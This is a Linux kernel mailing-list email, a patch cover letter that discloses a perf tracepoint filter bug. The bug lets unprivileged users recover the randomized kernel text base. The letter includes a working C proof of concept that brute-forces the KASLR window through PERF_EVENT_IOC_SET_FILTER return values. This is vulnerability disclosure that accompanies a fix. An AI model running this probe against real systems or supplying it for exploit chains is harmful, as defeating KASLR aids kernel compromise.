Received: from mail-dy2-f42.google.com (mail-dy2-f42.google.com [74.125.229.42])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 40C61339397
	for <linux-trace-kernel@vger.kernel.org>; Thu,  1 Oct 2026 23:46:23 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.229.42
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1790898385; cv=none; b=qkPFxiCD5DWbQX0RhOO9K6I1LIJygvVxzTxAPPv1GoY+c/g6oaE/5Ua3hduT1Dd9gf3hileX86pFGYEXeFq1yf5NyZ5VSdrZVWXzkjRnGQla7PmbSd6L7pZ1QtDSPLDfUV31YQsDrfqzcb8iSnEFhGw4Bx94AyTgVMfdcOKieQM=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1790898385; c=relaxed/simple;
	bh=xAV81QeqR4ZtpFqOVKF9+IHtT4wTiC4bAZ5jEUD3yEo=;
	h=From:To:Cc:Subject:Date:Message-Id:MIME-Version; b=Q1DLhTlgG2p0gMebbeUFUFj90rJ/hQFTZ+l03PuQ7H0Tv67syG3njXlerBlDC/Skd4Puez6aVeCmzO3fRjOXhXbXMElYQlmBhlyF4fPu2lxzUzC4FyGkP4eyz+7i1AJCsXx0Wl974sb7kvHorFPVC8U9StO1iLl802QOeEGdVrA=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=Qcty6SCC; arc=none smtp.client-ip=74.125.229.42
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="Qcty6SCC"
Received: by mail-dy2-f42.google.com with SMTP id 5a478bee46e88-3411e0ace58so9021429eec.0
        for <linux-trace-kernel@vger.kernel.org>; Thu, 01 Oct 2026 16:46:23 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1790898383; x=1791503183; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=SgLgFlJ5lNb0xBi63DpiDCEsIJzMQgnYp0doLWd9kSc=;
        b=Qcty6SCCxo8yyusn1pqFL9mTlnmwVvyZH7jhAfY/+qGz1D7ZF9Cb2ZvKpVs0nWQ1U2
         tYIMN9hV86Vt7OlkhvvnhItcS4GlnqvzyV3bq1IglvH76vnIWy2hHq/uqdd0kaIBF/5k
         3nZkrxs6eGpZb5/4H+/my9YvcxAna+MfA+PxhXioXSPYtGxPAk97EjtGSePMuiKIo2Ba
         R6BkhbI5zKZKB64a9dERdGSHvdTuwlk7Y1EKqfhLuSV4M9Rb83xGWHYmpIwiZwNpx7V4
         SIXo8PAuoG/S7FXAZ79tkDrNQd+1TgiIZYAjTAZLPAgW1idhy0Tyo52GAHDA/ZJqBomC
         bv7g==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1790898383; x=1791503183;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=SgLgFlJ5lNb0xBi63DpiDCEsIJzMQgnYp0doLWd9kSc=;
        b=JoiWnnN2AKraNsf/wrrsX6myUxFjm1leamOIeDKTxb1y45b1GXPrEbr+T0w98eRNgn
         kvRjR28ACL2fN/3H4FN0XC6P5RiOaahsFXP9tdbe32k5hXfsOAFkXUiNgopjuvWOFmgU
         8OUNFGFoUGNBrYo5MvghePNtF25DR/vYHhgpzsLOqat1UFPKlWGNJVQqvY6Mo6xnFq+H
         e48+wlbGBsv1ATncanXhpNPsUUCacJRstw+bLJe/lN2dfD3RPE+CUkWC7dEo1AZ+OUjQ
         wKtyr1NHqaGzdsxrKaPdRhQS+Lw9Ft/nApbaX6/nqbjB8842R8BHYPtjC0uVD4aAzqPN
         KiXw==
X-Forwarded-Encrypted: i=1; AKwUvBymV9MZgjjSAduXEwY8fzV6DpEh47OUFaqRsFtWi6rB0K+GZW1kRxTqZ9QKxA8dzJz2KAcorQbPBWBQHpFqSr0Zeo0=@vger.kernel.org
X-Gm-Message-State: AFuF++m9mXfWt1934YpmQV8cVY22fHiiF6pzysNp/vb1q4i1Ey8SmVlV
	7gda0Qvb1nO3kjQYDQHQgDe2vo8kGp4a2nL61J7hwI5a96BJl+pIP4Wp
X-Gm-Gg: AYBFou0C3wCforW96sKLu5keYpw42TIhjKVTNt9vIU2FV9HkswpzS9X+qceJeBuGg8N
	V/UIQgJMIaMdj6tZPPg/2YMbj28gIkhNwp+6vlqu8bRSrHZ8LMFo4/7nh8ZinZ87KvDNrjOpcGJ
	arW53YVaoQM4lJO2GGDZWMM5lcGbjIPlaECDIbHyJpbdr8TG4qgfTHn+cnUx6GJg4N5vOa+M/G2
	I9WIgXoWmlA/mTKxGB3sgBjsaON8tuW7r8Lsak4Vas3KfZ6BCjxGfnjA0dbQb07WjgScaUZR2gz
	nJF5iNb84jaSxEhciipHfrZ9tOxtK2dhH50/bmySsuNszaJtjBDxc7KoVBRot0e3mlbOZR88unR
	ABf4nqbHtnNHtItcx8zw5t/OgyBAP5l2nxAVXPhhihDVfLNx0dzDqUFI/XDlMPBmEfd38rRfGCl
	FZLN5wDoDaK7uPKnnalhOSqkNrsZl9ekwsNR2Flwbuu1RdS/jhMM39MjmNHAHq3FhfFrYXijL4d
	b7qDPcb
X-Received: by 2002:a05:7023:a5c:20b0:14d:baf5:c415 with SMTP id a92af1059eb24-14f5b21a47dmr842213c88.7.1790898382988;
        Thu, 01 Oct 2026 16:46:22 -0700 (PDT)
Received: from kq.cs.ucr.edu (kq.cs.ucr.edu. [169.235.27.223])
        by smtp.gmail.com with ESMTPSA id a92af1059eb24-14f45fedd43sm2542818c88.4.2026.10.01.16.46.22
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 01 Oct 2026 16:46:22 -0700 (PDT)
From: Zhengchuan Liang <zcliangcn@gmail.com>
To: Peter Zijlstra <peterz@infradead.org>
Cc: Ingo Molnar <mingo@redhat.com>,
	Arnaldo Carvalho de Melo <acme@kernel.org>,
	Namhyung Kim <namhyung@kernel.org>,
	Mark Rutland <mark.rutland@arm.com>,
	Alexander Shishkin <alexander.shishkin@linux.intel.com>,
	Jiri Olsa <jolsa@kernel.org>,
	Ian Rogers <irogers@google.com>,
	Adrian Hunter <adrian.hunter@intel.com>,
	James Clark <james.clark@linaro.org>,
	Steven Rostedt <rostedt@goodmis.org>,
	Masami Hiramatsu <mhiramat@kernel.org>,
	Mathieu Desnoyers <mathieu.desnoyers@efficios.com>,
	Ross Zwisler <zwisler@google.com>,
	linux-perf-users@vger.kernel.org,
	linux-trace-kernel@vger.kernel.org,
	linux-kernel@vger.kernel.org,
	Zhengchuan Liang <zcliangcn@gmail.com>
Subject: [PATCH v2 0/1] perf/core: Prevent tracepoint filters from exposing the kernel text base
Date: Thu,  1 Oct 2026 16:46:10 -0700
Message-Id: <cover.1790891867.git.zcliangcn@gmail.com>
X-Mailer: git-send-email 2.25.1
Precedence: bulk
X-Mailing-List: linux-trace-kernel@vger.kernel.org
List-Id: <linux-trace-kernel.vger.kernel.org>
List-Subscribe: <mailto:linux-trace-kernel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-trace-kernel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi,

I found and validated an information leak in
kernel/trace/trace_events_filter.c. An unprivileged user can recover the
randomized kernel text base, revealing the kernel's KASLR slide, by
observing PERF_EVENT_IOC_SET_FILTER return values for a disabled,
count-only perf tracepoint event.

Such an event can be opened with exclude_kernel=1 and sample_type=0. The
ioctl nevertheless accepts .function predicates. A numeric operand is
passed to kallsyms_lookup_size_offset(), so success distinguishes an
address in the kernel image from one outside it. A symbolic operand
likewise resolves a kernel symbol internally and can compare its address
with a task-controlled tracepoint field.

Here is a minimized numeric PoC for an x86_64 kernel built with
CONFIG_KALLSYMS_ALL=y. The scan uses 2 MiB steps, the minimum permitted
value of CONFIG_PHYSICAL_ALIGN on x86_64, and covers the 1 GiB virtual
KASLR window. Event ID 5 identifies the built-in TRACE_PRINT event.
The upstream default is perf_event_paranoid=2. Some distributions retain
that setting, while others use a stricter value. With the default
setting, run the PoC as an unprivileged user:

  #define _GNU_SOURCE
  #include <linux/perf_event.h>
  #include <stdio.h>
  #include <sys/ioctl.h>
  #include <sys/syscall.h>
  #include <unistd.h>

  int main(void)
  {
          struct perf_event_attr a = {
                  .type = PERF_TYPE_TRACEPOINT, .size = sizeof(a),
                  .config = 5, .disabled = 1, .exclude_kernel = 1,
          };
          int fd = syscall(SYS_perf_event_open, &a, 0, -1, -1, 0);
          char filter[64];

          if (fd < 0)
                  return 1;
          for (unsigned long long p = 0xffffffff80000000ULL;
               p < 0xffffffffc0000000ULL; p += 0x200000ULL) {
                  snprintf(filter, sizeof(filter),
                           "ip.function == 0x%llx", p);
                  if (!ioctl(fd, PERF_EVENT_IOC_SET_FILTER, filter)) {
                          printf("_stext=0x%llx\n", p);
                          return 0;
                  }
          }
          return 2;
  }

I reproduced the leak under these conditions as an unprivileged user on
a kernel built from the current upstream tree. The reported _stext
matched the value in /proc/kallsyms as read by root. The PoC needs no
tracefs access or perf sample data.
